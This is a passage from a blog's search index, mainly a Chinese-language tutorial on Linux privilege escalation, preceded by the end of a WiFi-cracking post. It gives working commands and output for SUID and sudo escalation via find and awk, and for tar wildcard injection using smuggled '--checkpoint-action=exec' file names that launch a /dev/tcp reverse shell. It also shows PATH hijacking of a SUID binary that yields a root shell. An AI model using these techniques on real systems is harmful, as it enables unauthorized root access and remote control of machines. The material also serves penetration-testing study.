字典路径\r","date":"2020-10-09T00:00:00Z","image":"https://coollllllll.github.io/p/wifi/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/wifi/","title":"破解WiFi密码"},{"content":"Linux提权 suid和sudo提权 suid SUID，英文全称是Set owner User ID up on execution，它是一种特殊的文件权限，能够让用户(如Tom)用其他用户(如root用户)的权限运行一个程序，而不需要用sudo进行临时提权。\n一个程序执行时会有三个id状态，分别如下：\n Real User ID：执行这个程序的用户的真实id，以用户登录时候的id为准 Effective User ID：是程序执行过程中使用权限时真正起作用的用户id，操作系统在检查一个程序有没有某个权限的时候会查看该id Saved User ID：程序临时提权时需要保存的先前的用户id，等提权结束后需要回退到这个用户id  suid用途 如果用户Tom有另一个用户root的程序的执行权限，并且root给这个程序设置了SUID位，那么Tom就可以用root的权限来执行这个程序\n遍历suid文件 find / -perm -u=s 2\u0026gt;/dev/null\r\r\n设置suid # 设置suid位\rchmod 4xxx filename\r# 设置sgid位\rchmod 2xxx filename\r# 设置suid和sgid位\rchmod 6xxx filename\r其中xxx指的是文件的一般读写执行权限\r取消suid # 取消suid和sgid\rchmod xxx filename\r# 取消suid或sgid\rchmod u-s filename or chmod g-s filename\r注意 suid位只对编译过的可执行程序起作用，比如给某一个sh脚本赋予suid位置，而sh脚本的实际执行程序是sh或者bash之类，如果它们在执行的时候并不会检查脚本文件的suid位，就不会起作用了\nsuid提权姿势 find find . -exec /bin/sh -p \\; -quit\r 注意:前提都是find可执行文件具备suid\n 其他类似的：https://gtfobins.github.io/\nsudo sudo权限是把本来只能超级用户执行的命令赋予普通用户执行\n要配置sudo，需要修改/etc/sudoers\n# sudoers文件对某个用户或用户组的sudo配置\r授权用户/组 主机 =[(切换到哪些用户或组)] [是否需要输入密码验证] 命令1,命令2,...\r字段1 字段2 字段3 字段4 字段5\r# 字段1\r不以%开头表示授权用户； 以%开头表示授权用户组\r# 字段2\r表示允许登录的主机；ALL表示所有;如果该字段不为ALL,表示授权用户只能在某些机器上登录本服务器来执行sudo命令\r# 字段3\r如果省略, 相当于(root:root)，表示可以通过sudo提权到root; 如果为(ALL)或者(ALL:ALL), 表示能够提权到(任意用户:任意用户组)\r# 字段4\r可能取值是NOPASSWD:，注意NOPASSWD后面带有冒号:，表示执行sudo时可以不需要输入密码\r# 字段5\r用逗号分开一系列命令，ALL表示允许所有操作\rsudo -l可查看自己的sudo配置\n\r\nsudo提权姿势 sudo /usr/bin/awk 'BEGIN {system(\u0026quot;/bin/sh\u0026quot;)}'\rsudo find . -exec /bin/sh \\; -quit\r\r\n其他类似sudo提权命令:https://gtfobins.github.io/\n通配符提权  该类提权一般都配合计划任务，发现计划任务使用了相关命令通配符\n 通配符 *：匹配任意数量字符\n?：匹配任意单个字符\n[]：一组字符，其中任意一个字符都可匹配该位置单个字符\n~：单个表示当前用户主目录名称，~后跟用户名表示某用户根目录名称\n示例 示例1 test目录下有2个文件\ncool@cool-virtual-machine:~/test$ ls\rtest2 test.txt\r执行cat *\ncool@cool-virtual-machine:~/test$ cat *\rsadadada\rhahahah\r创建\u0026ndash;help文件\ncool@cool-virtual-machine:~/test$ echo \u0026quot;my help\u0026quot; \u0026gt; --help\rcool@cool-virtual-machine:~/test$ ls\r--help test2 test.txt\r再次执行cat *\ncool@cool-virtual-machine:~/test$ cat *\rUsage: cat [OPTION]... [FILE]...\rConcatenate FILE(s) to standard output.\rWith no FILE, or when FILE is -, read standard input.\r-A, --show-all equivalent to -vET\r-b, --number-nonblank number nonempty output lines, overrides -n\r-e equivalent to -vE\r-E, --show-ends display $ at end of each line\r-n, --number number all output lines\r-s, --squeeze-blank suppress repeated empty output lines\r可观察到并没有读取\u0026quot;\u0026ndash;help\u0026quot;文件的内容，而是被视为\u0026quot;cat\u0026quot;命令的\u0026ndash;help命令帮助选项\n这种可称为**\u0026ldquo;wildcard wildness\u0026rdquo;**\n示例2 在test目录下生成反弹shell脚本\ncool@cool-virtual-machine:~/test$ echo \u0026quot;/bin/sh -i\u0026gt;\u0026amp;/dev/tcp/127.0.0.1/7777 0\u0026gt;\u0026amp;1\u0026quot; \u0026gt; shell.sh\rcool@cool-virtual-machine:~/test$ ls\rshell.sh\r生成如下文件\ncool@cool-virtual-machine:~/test$ echo \u0026quot;\u0026quot; \u0026gt; \u0026quot;--checkpoint-action=exec=sh shell.sh\u0026quot;\rcool@cool-virtual-machine:~/test$ echo \u0026quot;\u0026quot; \u0026gt; \u0026quot;--checkpoint=1\u0026quot;\rcool@cool-virtual-machine:~/test$ ls\r--checkpoint=1 --checkpoint-action=exec=sh shell.sh shell.sh\r监听端口\ncool@cool-virtual-machine:~$ nc -nvlp 7777\rListening on [0.0.0.0] (family 0, port 7777)\r执行tar命令\ncool@cool-virtual-machine:~/test$ tar cf /tmp/test.tar *\r监听结果\ncool@cool-virtual-machine:~$ nc -nvlp 7777\rListening on [0.0.0.0] (family 0, port 7777)\rConnection from [127.0.0.1] port 7777 [tcp/*] accepted (family 2, sport 36508)\rsh-4.3$ id\rid\ruid=1000(cool) gid=1000(cool) groups=1000(cool),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)\r注意\n tar命令的通配符注入需要进入到目标目录，使用通配符\u0026quot;*\u0026quot;，例如 tar -cf /tmp/test.tar *\n使用绝对路径，如：tar -cf /tmp/test.tar /tmp/test/*, 那么\u0026ndash;checkpoint等会失效，无法执行命令\n 敏感文件 Path 环境变量劫持 system函数会调用shell(sh)执行命令(传入的参数)\n现有这样一段可执行程序，如：\n#include\u0026lt;unistd.h\u0026gt;\rvoid main()\r{\rsetuid(0);\rsetgid(0);\rsystem(\u0026quot;whoami\u0026quot;);\r}\r以root用户编译后生成“haha”可执行文件如下(具有suid位)：\nroot@cool-virtual-machine:/home/cool/test# ll\rtotal 40\rdrwxrwxr-x 2 cool cool 4096 10月 25 10:56 ./\rdrwxr-xr-x 27 cool cool 4096 10月 25 09:29 ../\r-rwsr-xr-x 1 root root 8656 10月 25 10:56 haha*\r以普通用户编译这样一段程序：\n#include\u0026lt;unistd.h\u0026gt;\rvoid main()\r{\rsystem(\u0026quot;/bin/bash\u0026quot;);\r}\r生成\u0026quot;whoami\u0026quot;文件：\ncool@cool-virtual-machine:~/test$ ll\rtotal 40\rdrwxrwxr-x 2 cool cool 4096 10月 25 11:00 ./\rdrwxr-xr-x 27 cool cool 4096 10月 25 09:29 ../\r-rwsr-xr-x 1 root root 8656 10月 25 10:56 haha*\r-rw-rw-r-- 1 cool cool 86 10月 25 10:56 test.c\r-rwxrwxr-x 1 cool cool 8608 10月 25 10:50 whoami*\r劫持环境变量：\ncool@cool-virtual-machine:~/test$ export PATH=/home/cool/test:$PATH\rcool@cool-virtual-machine:~/test$ which whoami\r/home/cool/test/whoami\r执行./haha：\ncool@cool-virtual-machine:~/test$ ./haha\rroot@cool-virtual-machine:~/test# id\ruid=0(root) gid=1000(cool) groups=1000(cool),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)\r","date":"2020-09-09T00:00:00Z","image":"https://coollllllll.github.io/p/1/luca-bravo-alS7ewQ41M8-unsplash.jpg","permalink":"https://coollllllll.github.io/p/1/","title":"Linux 提权"}]